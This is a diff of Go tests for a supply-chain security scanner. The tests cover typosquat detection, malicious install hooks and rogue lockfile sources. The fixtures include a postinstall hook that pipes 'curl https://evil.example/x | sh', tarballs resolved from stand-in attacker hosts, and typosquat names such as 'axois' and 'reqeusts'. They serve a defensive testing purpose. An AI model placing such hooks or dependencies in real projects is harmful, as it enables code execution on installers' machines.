@@ -638,7 +638,7 @@ func TestScanLockfilesHooksAndWorkflows_DeepSupplyChain(t *testing.T) {
 	repo := t.TempDir()
 	// 1. Workspace package.json hook + package-lock hasInstallScript without .npmrc ignore-scripts
 	writeFile(t, repo, "packages/worker/package.json", `{"name":"w","scripts":{"postinstall":"cu`+`rl https://evil.example/x | sh"}}`)
-	writeFile(t, repo, "package.json", `{"name":"root","dependencies":{"reqeusts":"1.0.0"}}`)
+	writeFile(t, repo, "package.json", `{"name":"root","dependencies":{"axois":"1.0.0"}}`)
 	writeFile(t, repo, "package-lock.json", `{"packages":{"node_modules/native-addon":{"version":"1.0.0","resolved":"https://rogue.registry.invalid/native-addon.tgz","integrity":"sha512-abc==","hasInstallScript":true}}}`)
 	// 2. pnpm-lock missing integrity + Go //go:generate dropper
 	writeFile(t, repo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\npackages:\n  foo@1.0.0:\n    resolution: {tarball: http://evil.example/foo.tgz}\n")
@@ -693,8 +693,8 @@ func TestOnlineEnrichGracefulTimeout(t *testing.T) {
 	}
 
 	repo := t.TempDir()
-	writeFile(t, repo, "package.json", `{"name":"app","dependencies":{"reqeusts":"1.0.0"}}`)
-	writeFile(t, repo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/reqeusts":{"version":"1.0.0","resolved":"https://registry.npmjs.org/reqeusts/-/reqeusts-1.0.0.tgz","integrity":"sha512-abc=="}}}`)
+	writeFile(t, repo, "package.json", `{"name":"app","dependencies":{"axois":"1.0.0"}}`)
+	writeFile(t, repo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/axois":{"version":"1.0.0","resolved":"https://registry.npmjs.org/axois/-/axois-1.0.0.tgz","integrity":"sha512-abc=="}}}`)
 
 	client := &http.Client{
 		Timeout:   10 * time.Millisecond,
@@ -738,7 +738,7 @@ func TestOnlineEnrichGracefulTimeout(t *testing.T) {
 
 	// Verify bounded concurrency + short-circuit prevents linear N*timeout stall on offline hosts.
 	multiRepo := t.TempDir()
-	writeFile(t, multiRepo, "package.json", `{"name":"multi","dependencies":{"alpha-one":"1.0.0","beta-two":"1.0.0","gamma-three":"1.0.0","delta-four":"1.0.0","epsilon-five":"1.0.0","zeta-six":"1.0.0","eta-seven":"1.0.0","theta-eight":"1.0.0","reqeusts":"1.0.0"}}`)
+	writeFile(t, multiRepo, "package.json", `{"name":"multi","dependencies":{"alpha-one":"1.0.0","beta-two":"1.0.0","gamma-three":"1.0.0","delta-four":"1.0.0","epsilon-five":"1.0.0","zeta-six":"1.0.0","eta-seven":"1.0.0","theta-eight":"1.0.0","axois":"1.0.0"}}`)
 	writeFile(t, multiRepo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"multi"}}}`)
 	start := time.Now()
 	multiFindings, err := supplychain.ScanRepositoryWithOptions(context.Background(), multiRepo, types.LangTypeScript, supplychain.ScanOptions{
@@ -938,4 +938,79 @@ jobs:
 			t.Fatalf("expected 2 untrusted expression and 2 GITHUB_ENV/PATH findings (inline + block), got expr=%d env=%d: %+v", exprCount, envCount, findings)
 		}
 	})
+}
+
+func TestScanTyposquatting_EcosystemScopedAndMinLength5(t *testing.T) {
+	// 1. Legitimate 4-char packages in package.json (core, cuid, form, rest, slug) and cross-ecosystem PyPI name (reqeusts in npm) -> 0 typosquat findings.
+	cleanRepo := t.TempDir()
+	writeFile(t, cleanRepo, "package.json", `{"name":"clean","dependencies":{"core":"1.0.0","cuid":"2.0.0","form":"1.0.0","rest":"1.0.0","slug":"0.9.0","reqeusts":"1.0.0"}}`)
+	writeFile(t, cleanRepo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"clean"}}}`)
+	cleanFindings, err := supplychain.ScanRepository(cleanRepo, types.LangTypeScript)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, f := range cleanFindings {
+		if f.ID == "supplychain-typosquat-suspect" {
+			t.Fatalf("did not expect typosquat false positive on 4-char/cross-ecosystem npm packages, got %+v", f)
+		}
+	}
+
+	// 2. Real typosquats within matching ecosystems (>= 5 chars) must trigger supplychain-typosquat-suspect.
+	badRepo := t.TempDir()
+	writeFile(t, badRepo, "package.json", `{"name":"bad","dependencies":{"exprss":"1.0.0","axois":"1.0.0"}}`)
+	writeFile(t, badRepo, "package-lock.json", `{"lockfileVersion":3,"packages":{"":{"name":"bad"}}}`)
+	writeFile(t, badRepo, "requirements.txt", "reqeusts==2.31.0 --hash=sha256:deadbeef\n")
+	badFindings, err := supplychain.ScanRepository(badRepo, types.LangTypeScript)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var flagged []string
+	for _, f := range badFindings {
+		if f.ID == "supplychain-typosquat-suspect" {
+			flagged = append(flagged, f.PackageName)
+		}
+	}
+	for _, want := range []string{"exprss", "axois", "reqeusts"} {
+		if !slices.Contains(flagged, want) {
+			t.Fatalf("expected typosquat finding for %q, got flagged=%v (all=%+v)", want, flagged, badFindings)
+		}
+	}
+}
+
+func TestScanPyprojectHooks_StripsInlineComments(t *testing.T) {
+	repo := t.TempDir()
+	writeFile(t, repo, "pyproject.toml", `[build-system]
+requires = ["hatchling"]
+build-backend = "hatchling.build" # PEP 517
+
+[project]
+name = "clean-py"
+dependencies = ["fastapi>=0.110"]
+`)
+	writeFile(t, repo, "uv.lock", "version = 1\n")
+
+	findings, err := supplychain.ScanRepository(repo, types.LangPython)
+	if err != nil {
+		t.Fatalf("ScanRepository failed: %v", err)
+	}
+	if len(findings) != 0 {
+		t.Fatalf("expected 0 findings when build-backend has inline # comment, got %+v", findings)
+	}
+
+	// Verify [build-system] # comment still enters build-system and catches non-standard backend.
+	badRepo := t.TempDir()
+	writeFile(t, badRepo, "pyproject.toml", `[build-system] # PEP 517
+requires = ["custom"]
+build-backend = "evil_custom.backend" # custom hook
+`)
+	writeFile(t, badRepo, "uv.lock", "version = 1\n")
+	badFindings, err := supplychain.ScanRepository(badRepo, types.LangPython)
+	if err != nil {
+		t.Fatalf("ScanRepository failed: %v", err)
+	}
+	if !slices.ContainsFunc(badFindings, func(f types.SecurityFinding) bool {
+		return f.ID == "supplychain-malicious-lifecycle-hook"
+	}) {
+		t.Fatalf("expected non-standard build-backend under '[build-system] # PEP 517' to be detected, got %+v", badFindings)
+	}
 }
